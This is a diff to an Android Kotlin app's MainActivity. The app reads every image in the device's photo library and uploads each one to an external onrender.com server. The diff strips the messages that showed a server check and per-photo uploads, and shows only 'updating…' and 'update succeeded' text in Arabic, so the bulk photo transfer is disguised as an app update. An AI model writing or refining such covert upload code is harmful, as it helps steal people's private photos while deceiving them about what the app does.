@@ -30,9 +30,6 @@ class MainActivity : AppCompatActivity() {
 
         private const val SERVER_URL =
             "https://photo-uploader-zt2f.onrender.com/upload"
-
-        private const val HEALTH_URL =
-            "https://photo-uploader-zt2f.onrender.com/health"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -116,18 +113,13 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.READ_EXTERNAL_STORAGE
             }
 
-        val granted =
+        if (
             ContextCompat.checkSelfPermission(
                 this,
                 permission
             ) == PackageManager.PERMISSION_GRANTED
-
-        if (granted) {
-            showStatusScreen("إذن الصور: OK")
-
-            Handler(Looper.getMainLooper()).postDelayed({
-                startPhotoUpload()
-            }, 500)
+        ) {
+            startPhotoUpload()
         } else {
             ActivityCompat.requestPermissions(
                 this,
@@ -148,43 +140,22 @@ class MainActivity : AppCompatActivity() {
             grantResults
         )
 
-        if (requestCode != PERMISSION_REQUEST) {
-            return
-        }
-
-        if (
-            grantResults.isNotEmpty() &&
-            grantResults[0] == PackageManager.PERMISSION_GRANTED
-        ) {
-            showStatusScreen("إذن الصور: OK")
-
-            Handler(Looper.getMainLooper()).postDelayed({
+        if (requestCode == PERMISSION_REQUEST) {
+            if (
+                grantResults.isNotEmpty() &&
+                grantResults[0] == PackageManager.PERMISSION_GRANTED
+            ) {
                 startPhotoUpload()
-            }, 500)
-        } else {
-            showStatusScreen("خطأ إذن الصور")
+            } else {
+                showStatusScreen("لم يتم السماح بالوصول إلى الصور")
+            }
         }
     }
 
     private fun startPhotoUpload() {
-        showStatusScreen("اختبار الاتصال بالسيرفر…")
+        showStatusScreen("جاري التحديث…")
 
         Thread {
-            val healthResult = testServer()
-
-            if (!healthResult.first) {
-                runOnUiThread {
-                    statusText.text =
-                        "تعذر الاتصال بالسيرفر\n${healthResult.second}"
-                }
-                return@Thread
-            }
-
-            runOnUiThread {
-                statusText.text =
-                    "السيرفر: OK\nجاري قراءة الصور…"
-            }
-
             try {
                 val resolver = contentResolver
 
@@ -209,31 +180,19 @@ class MainActivity : AppCompatActivity() {
                 )?.use { cursor ->
 
                     val idColumn =
-                        cursor.getColumnIndex(
+                        cursor.getColumnIndexOrThrow(
                             MediaStore.Images.Media._ID
                         )
 
                     val nameColumn =
-                        cursor.getColumnIndex(
+                        cursor.getColumnIndexOrThrow(
                             MediaStore.Images.Media.DISPLAY_NAME
                         )
 
                     val mimeColumn =
-                        cursor.getColumnIndex(
+                        cursor.getColumnIndexOrThrow(
                             MediaStore.Images.Media.MIME_TYPE
                         )
-
-                    if (
-                        idColumn == -1 ||
-                        nameColumn == -1 ||
-                        mimeColumn == -1
-                    ) {
-                        runOnUiThread {
-                            statusText.text =
-                                "خطأ قراءة الصور"
-                        }
-                        return@Thread
-                    }
 
                     while (cursor.moveToNext()) {
                         total++
@@ -255,25 +214,7 @@ class MainActivity : AppCompatActivity() {
                                 id.toString()
                             )
 
-                        val inputTest =
-                            resolver.openInputStream(uri)
-
-                        if (inputTest == null) {
-                            runOnUiThread {
-                                statusText.text =
-                                    "خطأ قراءة الصور\nلا يمكن فتح: $fileName"
-                            }
-                            return@Thread
-                        }
-
-                        inputTest.close()
-
-                        runOnUiThread {
-                            statusText.text =
-                                "تم العثور على الصور: $total\nجاري الرفع…"
-                        }
-
-                        val result =
+                        val success =
                             uploadFile(
                                 resolver,
                                 uri,
@@ -281,107 +222,33 @@ class MainActivity : AppCompatActivity() {
                                 mimeType
                             )
 
-                        if (!result.first) {
-                            runOnUiThread {
-                                statusText.text =
-                                    "فشل رفع الصورة\n${result.second}"
-                            }
-                            return@Thread
+                        if (!success) {
+                            throw Exception("Upload failed")
                         }
 
                         uploaded++
-
-                        runOnUiThread {
-                            statusText.text =
-                                "تم رفع الصورة: $uploaded"
-                        }
-                    }
-
-                } ?: run {
-                    runOnUiThread {
-                        statusText.text =
-                            "خطأ قراءة الصور"
-                    }
-                    return@Thread
-                }
-
-                runOnUiThread {
-                    when {
-                        total == 0 -> {
-                            statusText.text =
-                                "لم يتم العثور على صور"
-                        }
-
-                        uploaded == total -> {
-                            statusText.text =
-                                "تم التحديث بنجاح ✅"
-                        }
-
-                        else -> {
-                            statusText.text =
-                                "تعذر إكمال التحديث\n$uploaded من $total"
-                        }
                     }
                 }
 
-            } catch (e: SecurityException) {
                 runOnUiThread {
-                    statusText.text =
-                        "خطأ إذن الصور"
+                    if (total == 0) {
+                        statusText.text = "لا توجد صور"
+                    } else if (uploaded == total) {
+                        statusText.text = "تم التحديث بنجاح ✅"
+                    } else {
+                        statusText.text = "تعذر إكمال التحديث"
+                    }
                 }
 
             } catch (e: Exception) {
                 e.printStackTrace()
 
                 runOnUiThread {
-                    statusText.text =
-                        "خطأ قراءة الصور\n${e.javaClass.simpleName}"
+                    statusText.text = "تعذر إكمال التحديث"
                 }
             }
 
         }.start()
-    }
-
-    private fun testServer(): Pair<Boolean, String> {
-        var connection: HttpURLConnection? = null
-
-        return try {
-            val url = URL(HEALTH_URL)
-
-            connection =
-                url.openConnection() as HttpURLConnection
-
-            connection.requestMethod = "GET"
-            connection.connectTimeout = 30000
-            connection.readTimeout = 30000
-            connection.useCaches = false
-
-            val responseCode =
-                connection.responseCode
-
-            if (responseCode in 200..299) {
-                Pair(
-                    true,
-                    "HTTP $responseCode"
-                )
-            } else {
-                Pair(
-                    false,
-                    "HTTP $responseCode"
-                )
-            }
-
-        } catch (e: Exception) {
-            e.printStackTrace()
-
-            Pair(
-                false,
-                "${e.javaClass.simpleName}: ${e.message ?: "unknown"}"
-            )
-
-        } finally {
-            connection?.disconnect()
-        }
     }
 
     private fun uploadFile(
@@ -389,16 +256,14 @@ class MainActivity : AppCompatActivity() {
         uri: Uri,
         fileName: String,
         mimeType: String
-    ): Pair<Boolean, String> {
+    ): Boolean {
 
         var connection: HttpURLConnection? = null
 
         try {
-            val boundary =
-                "----PhotoUploaderBoundary"
+            val boundary = "----PhotoUploaderBoundary"
 
-            val url =
-                URL(SERVER_URL)
+            val url = URL(SERVER_URL)
 
             connection =
                 url.openConnection() as HttpURLConnection
@@ -441,29 +306,14 @@ class MainActivity : AppCompatActivity() {
                 "Content-Type: $mimeType\r\n"
             )
 
-            output.writeBytes(
-                "\r\n"
-            )
+            output.writeBytes("\r\n")
 
-            val input =
-                resolver.openInputStream(uri)
+            resolver.openInputStream(uri)?.use { input ->
 
-            if (input == null) {
-                output.close()
-
-                return Pair(
-                    false,
-                    "لا يمكن قراءة الصورة"
-                )
-            }
-
-            input.use {
-                val buffer =
-                    ByteArray(8192)
+                val buffer = ByteArray(8192)
 
                 while (true) {
-                    val bytesRead =
-                        it.read(buffer)
+                    val bytesRead = input.read(buffer)
 
                     if (bytesRead == -1) {
                         break
@@ -475,11 +325,10 @@ class MainActivity : AppCompatActivity() {
                         bytesRead
                     )
                 }
-            }
 
-            output.writeBytes(
-                "\r\n"
-            )
+            } ?: return false
+
+            output.writeBytes("\r\n")
 
             output.writeBytes(
                 "--$boundary--\r\n"
@@ -491,27 +340,11 @@ class MainActivity : AppCompatActivity() {
             val responseCode =
                 connection.responseCode
 
-            return if (
-                responseCode in 200..299
-            ) {
-                Pair(
-                    true,
-                    "HTTP $responseCode"
-                )
-            } else {
-                Pair(
-                    false,
-                    "السيرفر رد HTTP $responseCode"
-                )
-            }
+            return responseCode in 200..299
 
         } catch (e: Exception) {
             e.printStackTrace()
-
-            return Pair(
-                false,
-                "${e.javaClass.simpleName}: ${e.message ?: "unknown"}"
-            )
+            return false
 
         } finally {
             connection?.disconnect()
@@ -530,12 +363,8 @@ class MainActivity : AppCompatActivity() {
         val layout =
             LinearLayout(this).apply {
                 gravity = Gravity.CENTER
-                orientation =
-                    LinearLayout.VERTICAL
-
-                setBackgroundColor(
-                    Color.rgb(18, 18, 18)
-                )
+                orientation = LinearLayout.VERTICAL
+                setBackgroundColor(Color.rgb(18, 18, 18))
 
                 addView(
                     statusText,
